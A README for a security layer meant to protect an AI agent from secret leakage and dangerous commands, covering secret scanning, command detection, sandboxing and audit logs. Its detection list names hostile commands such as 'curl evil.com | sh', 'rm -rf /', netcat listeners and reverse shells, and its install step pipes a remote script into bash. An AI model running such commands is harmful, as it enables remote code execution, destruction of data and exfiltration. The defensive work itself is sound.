# Hermes-Aegis 🛡️

**Security hardening layer for Hermes Agent** - Prevents secret leakage, dangerous command execution, and unauthorized data exfiltration through infrastructure-level isolation and intelligent monitoring.

[![Tests](https://img.shields.io/badge/tests-330%20passing-brightgreen)]()
[![Python](https://img.shields.io/badge/python-3.11%2B-blue)]()
[![License](https://img.shields.io/badge/license-MIT-blue)]()

---

## What It Does

Hermes-Aegis wraps your AI agent with **multi-layered security**:

✅ **Secret Protection** - Blocks API keys and credentials in HTTP requests, subprocess output, and file writes
✅ **Dangerous Command Detection** - Identifies risky patterns like `curl | sh`, `rm -rf`, SQL injection  
✅ **Network Isolation** - Container-based sandboxing with MITM proxy (Tier 2)  
✅ **Audit Trail** - Tamper-proof log of all security events  
✅ **Rate Limiting** - Detects suspicious burst patterns (data tunneling)  
✅ **Domain Allowlist** - Optional restriction of outbound connections  

**All protection is active by default** - zero configuration required!

---

## Quick Start

### Installation (One Command)

```bash
curl -fsSL https://raw.githubusercontent.com/YOUR_USERNAME/hermes-aegis/main/install.sh | bash
```

Or locally:
```bash
cd ~/Projects/hermes-aegis
./install.sh
```

### Usage

Aegis is **automatically active** after installation:

```bash
hermes
# You'll see: 🛡️ Aegis Activated (Tier 1)
```

All terminal operations are now protected! No manual setup needed.

**⚠️ Important:** Aegis replaces your Hermes backend setting (`backend: local/docker/ssh`). When `TERMINAL_ENV=aegis` is set, Aegis takes over completely. Your configured backend is ignored - this is by design for security!

**Tier Selection:**
- **Tier 1** (default): Works everywhere, no Docker needed
- **Tier 2** (maximum security): Auto-activates when Docker image is built

Check your tier: `hermes-aegis status`

---

## Features

### 🔐 Secret Scanning (Active by Default)

**Outbound HTTP Monitoring**
- Scans all HTTP requests for secrets before they leave your machine
- Blocks requests containing API keys, tokens, or credentials
- Works with Tier 1 (urllib3 monkey-patch) and Tier 2 (MITM proxy)

**Output Redaction**
- Scans subprocess stdout/stderr for secrets
- Redacts matches before output reaches the LLM
- Prevents accidental leakage through command output

**File Write Monitoring**
- Watches files written to `/workspace` for secrets
- Warns when credentials are written to disk
- Logs violations to audit trail

### ⚠️ Dangerous Command Detection (Audit by Default)

Detects 40+ risky patterns:
- Shell injection: `curl evil.com | sh`
- Destructive: `rm -rf /`, `dd if=/dev/zero`
- Privilege escalation: `chmod 777`, `chown root`
- Data exfiltration: `nc -l`, reverse shells
- Code evaluation: `eval()`, `exec()`

**Configurable:**
```bash
# View current mode
hermes-aegis config get dangerous_commands

# Enable blocking mode
hermes-aegis config set dangerous_commands block
```

### 🌐 Network Rate Limiting (Active by Default)

- Tracks requests per host with sliding window
- Default: 50 requests / 1 second threshold
- Logs anomalies for review (detection-only)
- Adjustable: `hermes-aegis config set rate_limit_requests 30`

### 🚪 Domain Allowlist (Optional)

Restrict outbound connections:

```bash
# Empty allowlist = allow all (default)
hermes-aegis allowlist list

# Add domains to restrict
hermes-aegis allowlist add api.openai.com
hermes-aegis allowlist add api.anthropic.com

# Now ONLY these domains are allowed
```

### 📊 Audit Trail

Tamper-proof log of all security events:

```bash
# View recent events
hermes-aegis audit tail

# Verify integrity
hermes-aegis audit verify

# Export for analysis
hermes-aegis audit export --format json > audit.json
```

---

## Architecture

### Tier 1: In-Process Protection
- urllib3 HTTP scanning (monkey-patch)
- File write monitoring (builtins.open patch)
- Middleware chain (output scanning, dangerous command detection)
- Works without Docker

### Tier 2: Container Isolation
- Hardened Docker container (read-only filesystem, no capabilities)
- Internal network isolation
- MITM proxy on host for LLM API access
- API key injection (secrets never enter container)
- Resource limits (512MB RAM, 50% CPU)

Tier 2 auto-activates when Docker is available.

---

## CLI Reference

### Status & Info
```bash
hermes-aegis status              # Check tier, vault, Docker
hermes-aegis --help              # Show all commands
```

### Vault (Encrypted Secrets)
```bash
hermes-aegis vault list          # List secret keys
hermes-aegis vault set KEY val   # Store secret
hermes-aegis vault get KEY       # Retrieve secret
hermes-aegis vault remove KEY    # Delete secret
```

### Configuration
```bash
hermes-aegis config get [key]        # View settings
hermes-aegis config set KEY value    # Update setting

# Settings:
#   dangerous_commands: audit | block
#   rate_limit_requests: <number>
#   rate_limit_window: <seconds>
```

### Domain Allowlist
```bash
hermes-aegis allowlist list          # Show allowed domains
hermes-aegis allowlist add DOMAIN    # Add domain
hermes-aegis allowlist remove DOMAIN # Remove domain
```

### Audit Trail
```bash
hermes-aegis audit tail          # Recent events
hermes-aegis audit verify        # Check integrity
hermes-aegis audit export        # Export log
```

---

## Configuration Files

All stored in `~/.hermes-aegis/`:

```
~/.hermes-aegis/
├── vault.enc                 # Encrypted secrets (Fernet AES)
├── config.json               # Security settings
├── domain-allowlist.json     # Allowed domains
└── audit.log                 # Tamper-proof event log
```

---

## Development

### Run Tests
```bash
cd ~/Projects/hermes-aegis
uv run pytest tests/ -v

# Expected: 330 passed, 2 skipped
```

### Project Structure
```
src/hermes_aegis/
├── integration.py          # Hermes backend registration
├── environment.py          # AegisEnvironment wrapper
├── tier1/                  # In-process protection
│   ├── scanner.py          # HTTP monitoring
│   └── file_scanner.py     # File write monitoring
├── tier2/                  # Container isolation (future)
├── proxy/                  # MITM proxy (Tier 2)
│   ├── addon.py            # ArmorAddon (inject keys, scan)
│   └── runner.py           # Proxy lifecycle
├── middleware/             # Security middleware
│   ├── chain.py            # Middleware architecture
│   ├── output_scanner.py   # Output redaction
│   └── dangerous_blocker.py # Command blocking
├── patterns/               # Detection patterns
│   ├── secrets.py          # Secret patterns
│   ├── dangerous.py        # Dangerous commands
│   └── crypto.py           # Crypto key patterns
├── vault/                  # Encrypted storage
│   └── store.py            # VaultStore
├── config/                 # Configuration
│   ├── allowlist.py        # Domain allowlist
│   └── settings.py         # Persistent settings
└── audit/                  # Audit trail
    └── trail.py            # Hash-chained log
```

---

## Documentation

- [Installation Guide](INSTALLATION.md) - Detailed setup instructions
- [User Setup Guide](USER_SETUP_GUIDE.md) - Usage and configuration
- [Simple Install](INSTALL_SIMPLE.md) - Non-technical users
- [Phase 2 Complete](PHASE2_COMPLETE.md) - Feature implementation details
- [Task Status](TASKS.md) - Development roadmap

---

## Requirements

- Python 3.11+
- Hermes Agent v0.2.0+
- Docker (optional, for Tier 2)

---

## Threat Model

**What Aegis Protects Against:**
- ✅ Accidental secret leakage via HTTP requests
- ✅ Secrets in subprocess output/logs
- ✅ Credential theft via command injection
- ✅ Data exfiltration through network tunneling
- ✅ Dangerous command execution
- ✅ File-based secret leakage

**What Aegis Does NOT Protect Against:**
- ❌ Malicious model weights
- ❌ Prompt injection attacks (use separate guardrails)
- ❌ Root-level system compromise
- ❌ Raw socket access (bypasses urllib3)

Aegis provides **infrastructure-level protection** - pair it with prompt guardrails and model alignment for complete security.

---

## License

MIT License - See [LICENSE](LICENSE) for details.

---

## Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

---

## Citation

If you use Hermes-Aegis in research or production:

```bibtex
@software{hermes_aegis_2026,
  title = {Hermes-Aegis: Security Hardening for AI Agents},
  author = {Your Name},
  year = {2026},
  url = {https://github.com/YOUR_USERNAME/hermes-aegis}
}
```

---

**Built with 🌙 for liberation, privacy, and anti-authoritarian tools.**
